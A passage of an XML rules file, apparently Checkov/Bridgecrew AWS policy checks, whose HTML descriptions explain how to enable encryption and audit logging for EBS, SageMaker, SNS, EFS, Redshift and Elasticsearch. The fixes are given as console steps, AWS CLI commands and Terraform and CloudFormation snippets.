<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
    iotCatalog:
      Type: AWS::DynamoDB::Table 
      Properties:
        ...
        PointInTimeRecoverySpecification:
+         PointInTimeRecoveryEnabled: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_6' target='_blank'> https://docs.bridgecrew.io/docs/general_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_8</key>
    <name>Ensure Instances and Launch configurations use encrypted EBS volumes</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="launch-configurations-do-not-have-encrypted-ebs-volumes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-launch-configurations-do-not-have-encrypted-ebs-volumes"></div>Launch configurations do not have encrypted EBS volumes</div><a aria-label="Skip link to Launch configurations do not have encrypted EBS volumes" class="heading-anchor-icon fa fa-anchor" href="#launch-configurations-do-not-have-encrypted-ebs-volumes"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Elastic Block Store (EBS) volumes allow you to create encrypted launch configurations when creating EC2 instances and auto scaling. When the entire EBS volume is encrypted, data stored at rest on the volume, disk I/O, snapshots created from the volume, and data in-transit between EBS and EC2 are all encrypted.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/ec2/" target="_self">Amazon EC2 console</a></strong>.</li>
<li>Navigate to <strong>Auto Scaling</strong>.</li>
<li>Create a new launch configuration.</li>
<li>Add an <strong>encrypted EBS volume</strong> (Add Storage).</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws autoscaling create-launch-configuration 
--launch-configuration-name my-launch-config
--image-id ami-c6169af6
--instance-type m1.medium
--encrypted true
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_launch_configuration</li>
<li><strong>Attribute</strong>: encrypted - (Optional) Whether the volume should be encrypted or not. Do not use this option if you are using snapshot_id as the encrypted flag will be determined by the snapshot. (Default: false). </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_launch_configuration" "example" {
  ...
  instance_type = "t2.micro"
+ root_block_device {
+ encrypted     = true
+ }
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::AutoScaling::LaunchConfiguration</li>
<li><strong>Attribute</strong>: Properties.BlockDeviceMappings </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">AutoScalingConfig:
    Type: AWS::AutoScaling::LaunchConfiguration
    Properties:
      ...
      BlockDeviceMappings:
      - DeviceName: "/dev/sdk"
+       Ebs:
          ...
+         Encrypted: true
      - DeviceName: "/dev/sdf"
        Ebs:
            ...
-         Encrypted: false
            - DeviceName: "/dev/sdc"
-       VirtualName: ephermal
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_13' target='_blank'> https://docs.bridgecrew.io/docs/general_13</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_13' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_22</key>
    <name>Ensure all data stored in SageMaker is securely encrypted at rest</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="data-stored-in-sagemaker-is-not-securely-encrypted-at-rest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-data-stored-in-sage-maker-is-not-securely-encrypted-at-rest"></div>Data stored in SageMaker is not securely encrypted at rest</div><a aria-label="Skip link to Data stored in SageMaker is not securely encrypted at rest" class="heading-anchor-icon fa fa-anchor" href="#data-stored-in-sagemaker-is-not-securely-encrypted-at-rest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon SageMaker enables you to pass a KMS key to SageMaker notebooks, securing the following resources:</p>
<ul>
<li>Storage volume</li>
<li>Processing jobs</li>
<li>Training jobs</li>
<li>Hyperparameter tuning jobs</li>
<li>Batch transform jobs</li>
<li>Endpoints</li>
</ul>
<p>By applying encryption at-rest you ensure that the data stored on your AWS SageMaker notebook instances meet regulatory requirements and protect your SageMaker data at rest. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/sagemaker/" target="_self">Amazon SageMaker console</a>.</li>
<li>Select Notebook instances, then click <strong>Create Notebook Instance</strong>.</li>
<li>On the Create Notebook Instance page, provide the required information.</li>
<li>The <strong>Encryption key</strong> lets you encrypt data on the ML storage volume attached to the notebook instance using an AWS Key Management Service (AWS KMS) key. If you plan to store sensitive information on the ML storage volume, consider encrypting the information.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To create a SageMaker notebook instance:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">create-notebook-instance
--notebook-instance-name &lt;value&gt;
--instance-type &lt;value&gt;
--kms-key-id &lt;value&gt;
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_sagemaker_notebook_instance</li>
<li><strong>Attribute</strong>: kms_key_id - (Optional) The AWS Key Management Service (AWS KMS) key that Amazon SageMaker uses to encrypt the model artifacts at rest using Amazon S3 server-side encryption. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_sagemaker_notebook_instance" "example" {
  ...
  name          = "my-notebook-instance"
+ kms_key_id    = &lt;value&gt;
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_14' target='_blank'> https://docs.bridgecrew.io/docs/general_14</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_14' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_26</key>
    <name>Ensure AWS SNS topic has SSE enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-sns-topic-has-sse-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-sns-topic-has-sse-disabled"></div>AWS SNS topic has SSE disabled</div><a aria-label="Skip link to AWS SNS topic has SSE disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-sns-topic-has-sse-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon SNS is a publishers and subscribers messaging service. When you publish messages to encrypted topics, customer master keys (CMK), powered by AWS KMS, can be used to encrypt your messages.</p>
<p>If you operate in a regulated market, such as HIPAA for healthcare, PCI DSS for finance, or FedRAMP for government, you need to ensure sensitive data messages passed in this service are encrypted at rest. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="sns-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sns-console"></div>SNS Console</div><a aria-label="Skip link to SNS Console" class="heading-anchor-icon fa fa-anchor" href="#sns-console"></a></h2>
<ol>
<li>Navigate to the <a href="https://console.aws.amazon.com/sns/v3/home" target="_self">SNS console</a> in AWS and select <strong>Topics</strong> on the left.</li>
<li>Open a topic.</li>
<li>In the top-right corner, click <strong>Edit</strong>.</li>
<li>Under <strong>Encryption</strong>, select <strong>Enable encryption</strong>.</li>
<li>Select a customer master key - you can use the default AWS key or a custom key in KMS.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws sns set-topic-attributes 
--topic-arn &lt;TOPIC_ARN&gt; 
--attribute-name "KmsMasterKeyId" 
--attribute-value &lt;KEY&gt;
</code></pre>
<p>The ARN format is <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">arn:aws:sns:REGION:ACCOUNTID:TOPIC_NAME</code></p>
<p>The key is a reference to a KMS key or alias. Use <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">alias/aws/sns</code> for the default AWS key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_sns_topic</li>
<li><strong>Argument</strong>: kms_master_key_id - (Optional) The ID of an AWS-managed customer master key (CMK) for Amazon SNS or a custom CMK. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_sns_topic" "example" {
  ...
  name              = "user-updates-topic"
+ kms_master_key_id = "alias/aws/sns"
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::SNS::Topic</li>
<li><strong>Argument</strong>: Properties.KmsMasterKeyId</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::SNS::Topic
    Properties:
      ...
+     KmsMasterKeyId: "kms_id"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_15' target='_blank'> https://docs.bridgecrew.io/docs/general_15</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_15' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_42</key>
    <name>Ensure AWS EFS with encryption for data at rest is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-efs-with-encryption-for-data-at-rest-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-efs-with-encryption-for-data-at-rest-is-disabled"></div>AWS EFS with encryption for data at rest is disabled</div><a aria-label="Skip link to AWS EFS with encryption for data at rest is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-efs-with-encryption-for-data-at-rest-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Elastic File System (Amazon EFS) is a simple, scalable file storage solution for AWS services and on-premises resources. Amazon EFS is built to elastically scale on-demand. It grows and shrinks automatically as files are added and removed. </p>
<p>It is essential to encrypt your Amazon EFS to protect data and metadata against unauthorized access. Encrypting your Amazon EFS also fulfils compliance requirements for data-at-rest encryption when file systems are used in production systems.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="amazon-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-amazon-console"></div>Amazon Console</div><a aria-label="Skip link to Amazon Console" class="heading-anchor-icon fa fa-anchor" href="#amazon-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/efs/" target="_self">Amazon Elastic File System console</a>.</li>
<li>To open the file system creation wizard, click <strong>Create file system</strong>.</li>
<li>Select <strong>Enable encryption</strong>.</li>
<li>To enable encryption using your own KMS CMK key, from the <strong>KMS master key</strong> list select the name of your <strong>AWS Key</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>In the CreateFileSystem operation, the --encrypted parameter is a Boolean and is required for creating encrypted file systems. The --kms-key-id is required only when you use a customer-managed CMK and you include the key&#8217;s alias or ARN. </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws efs create-file-system \
--creation-token $(uuidgen) \
--performance-mode generalPurpose \
--encrypted \
--kms-key-id user/customer-managedCMKalias
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_efs_file_system</li>
<li><strong>Arguments</strong>: encrypted - (Optional) If true, the disk will be encrypted. If you are using AWS KMS you can optionally provides a KMS customer master key.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_efs_file_system</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_efs_file_system">resource "aws_efs_file_system" "example"{
  ...
  creation_token                = "default-efs"
+ encrypted                   = true
+ kms_key_id = aws_kms_key.default-kms.arn
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::EFS::FileSystem</li>
<li><strong>Arguments</strong>: Encrypted - (Optional) If true, the disk will be encrypted. If you are using AWS KMS you can optionally provides a KMS customer master key.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  FileSystemResource:
    Type: 'AWS::EFS::FileSystem'
    Properties:
      ...
+     Encrypted: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_17' target='_blank'> https://docs.bridgecrew.io/docs/general_17</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_17' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_71</key>
    <name>Ensure AWS Redshift database has audit logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-redshift-database-does-not-have-audit-logging-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-redshift-database-does-not-have-audit-logging-enabled"></div>AWS Redshift database does not have audit logging enabled</div><a aria-label="Skip link to AWS Redshift database does not have audit logging enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-redshift-database-does-not-have-audit-logging-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Redshift logs information about connections and user activities in your database. These logs help you to monitor the database for security and troubleshooting purposes, a process often referred to as database auditing. The logs are stored in Amazon S3 buckets. These provide convenient access with data security features for users who are responsible for monitoring activities in the database.</p>
<p>Enabling S3 bucket logging on Redshift databases allows you to capture all events which may affect the database, this is useful in security and incident response workflows. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To enable Redshift to S3 bucket logging using the AWS Management Console, follow these steps: </p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/redshift" target="_self">Amazon Redshift console</a></strong>.</li>
<li>On the navigation menu, choose <strong>Clusters</strong>, then choose the cluster that you want to update.</li>
<li>Choose the <strong>Maintenance and Monitoring</strong> tab. Then view the <strong>Audit logging</strong> section.</li>
<li>Choose <strong>Edit </strong>tab.</li>
<li>On the Configure audit logging page, choose to Enable audit logging and enter your choices regarding where the logs are stored.</li>
<li>Click <strong>Confirm</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_redshift_cluster</li>
<li><strong>Argument</strong>: logging/enable is set to true.<br/>
An example terraform definition of an Amazon Redshift database with logging enabled, resolving the violation:</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_redshift_cluster" "default" {
    ...
    cluster_type       = "single-node"
+   logging {
+     enable = "true"
+   }
  }
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::Redshift::Cluster</li>
<li><strong>Argument</strong>: Properties.BucketName</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: "AWS::Redshift::Cluster"
    Properties:
      ...
+     LoggingProperties:
+       BucketName: "your_bucket"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_12' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_12</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_12' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_6</key>
    <name>Ensure AWS Elasticsearch has node-to-node encryption enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticsearch-does-not-have-node-to-node-encryption-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasticsearch-does-not-have-node-to-node-encryption-enabled"></div>AWS Elasticsearch does not have node-to-node encryption enabled</div><a aria-label="Skip link to AWS Elasticsearch does not have node-to-node encryption enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticsearch-does-not-have-node-to-node-encryption-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The AWS Elasticsearch Service makes it possible to host sensitive workloads with node-to-node encryption by using Transport Layer Security (TLS) for all communications between instances in a cluster. </p>
<p>Using node-to-node encryption ensures that any data you send to your Amazon Elasticsearch Service domain over HTTPS, remains encrypted in-flight while it is being distributed and replicated between the nodes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To enable the feature, you must create another domain and migrate your data.<br/>
Using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>. </li>
<li>Navigate to the <strong>Analytics</strong> section, select <strong>Elasticsearch Service</strong>.</li>
<li>To enable <em>node-to-node encryption</em> when you configure a new cluster, select <strong>Node-to-node encryption</strong>.</li>
</ol>
